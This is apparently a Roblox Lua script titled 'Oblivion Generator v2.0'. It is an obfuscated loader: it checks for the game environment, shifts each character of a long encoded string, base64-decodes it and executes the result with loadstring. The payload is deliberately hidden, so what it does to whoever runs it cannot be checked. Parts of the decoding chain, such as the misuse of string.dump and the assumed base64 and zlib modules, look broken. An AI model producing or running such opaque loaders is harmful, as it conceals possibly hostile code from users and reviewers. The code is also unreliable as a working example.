-- Oblivion Generator v2.0 | 1742216307
-- Secured Script Loader

local data_bHtA = function()
    local env = getfenv and getfenv() or _ENV or _G
    return (env.game and env.game:GetService("Players") ~= nil)
end

if not data_bHtA() then return end

local __JkVtA2y = function(data)
    local offset, encoded = data:match("(%d+):(.*)")
    offset = tonumber(offset)
    local result = ""
    for i = 1, #encoded do
        result = result .. string.char(string.byte(encoded:sub(i,i)) - offset)
    end
    return result
end

local tmp_NjneL44 = "4:iRvJZK5z6nsY3t9j]fIz}VYR9MYoXSuo4wypO:Sps;Vfu:wslIRmWF{{Xkt47[/jLUmoq:eSX8yIjHl/jN;rzRkrN/l:JSIQN{V5kEH5[INVtux5=E5txurvqq\YfYqOIx/P4Rlnrzy^rtIySo\TP~xzQtu:w;GvRei\{m4l3voyNqR]<j/XpTmQ|9h^Jg6YjJR<JJlOGXMeyUjM[LuVpwFm]N|nJMJ<8Ou[K^UW:[PKfy8x~rLEuvt6jXYt}:\x}:h]:EuEX]Fo}GRnxPRpFjJ47jfZ\f96ms{6;vVvr3j:znn7uSz3<;\lKJ\4eFrGxm|l:;e{Rg7oxtr;K{6R64;yR67;kPjxMzXe3^uyT3;;hXQQ/Qei:RLoNJ}Hei9{PN:;~r~V8:EV^sei}<8xhfVOuK|fTL~HeyU^}M9qs/3Mwi6mTGy7jx[S;s}JTznz}SVhx~\s\T3g]Hvx~=u|yXq:{3vzKv~puf:O\wnTzQm=~G|n6Is9{VetFl73otUE{6eo^:7^wwYljoOXpKIGuo3F]}HzV[4JX\mO[LWvmvU:Kmh;p]iHe{~V[QfsL89U=uP9X9ISMEvPREf9Jf7}:rsU7RjTsKZ}wn<simqh3nG<r9OrP/[Ofr[Yso/H{V4LQNtGzpZ6Lq|FOM=lpE]u9:YU8G[ne7V:mkmSFTK;9|jp~jTpfRUs<g]<GG^FOg}zITU=7={K747ETu8stsUrmGXwZge<OG{IYyEJWyMFloyk|MyFW:xEVYUwTTvFl\u]8HmRT935V\wphE/nQIpqEuLqGIoYwFEzF3~8/{zK9l5kgm\o|zN=vYe=N~\EPI|LOej{I<OEQRZT8xsx=Z]=H9TgKHH{MuE5GtRpPUUixFePzj:k6h~xZet9g|VJ7s/JKTFS;5T{]M85PqwvVJ6qM;o}rg:zSy6QTu{z^s{ET<{jJr:Ni^LiTixZ^J[V<8M/mNoZJgsXTnpFx}JismggV]lEFlXFGz}YU[p]5u;hx[iXUI|X{;P~}linVp4v<6GljguSzHlz7ty7v<6F[=o3R88j]3x/vtijLRhp;hx{gPJsLT7kSQfz\9}GupsmYIsz;ysKqzqHY{HZ\nzg7Ml/SM8]jM4z|7Zm8~94i<q\}fp|Pytsew^T~gm}ylT3nY;o|Mv4E6g/iMUA"
local z_Xow6Jop = function(data)
    local decoded = __JkVtA2y(data)
    local decompressed = require("base64").decode(decoded)
    decompressed = (loadstring or load)("return require('zlib').inflate(require('string').dump(...));")(decompressed)
    return (loadstring or load)(decompressed, "OblivionSecure")
end

z_Xow6Jop(tmp_NjneL44)()
